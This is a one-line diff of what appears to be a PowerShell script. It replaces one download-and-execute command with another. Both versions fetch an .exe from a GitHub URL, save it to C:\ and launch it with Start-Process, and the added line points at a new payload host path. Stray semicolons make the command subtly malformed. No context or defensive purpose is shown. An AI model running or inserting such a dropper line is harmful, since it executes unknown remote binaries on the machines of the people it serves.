@@ -1,1 +1,1 @@
-Invoke-WebRequest -Uri "https://github.com/corponezz/420/releases/download/420/420.exe"; -OutFile "C:\420.exe"; Start-Process -FilePath "C:\420.exe";
+Invoke-WebRequest -Uri "https://github.com/cs2cc/s/raw/main/1.exe"; -OutFile "C:\1.exe"; Start-Process -FilePath "C:\1.exe";
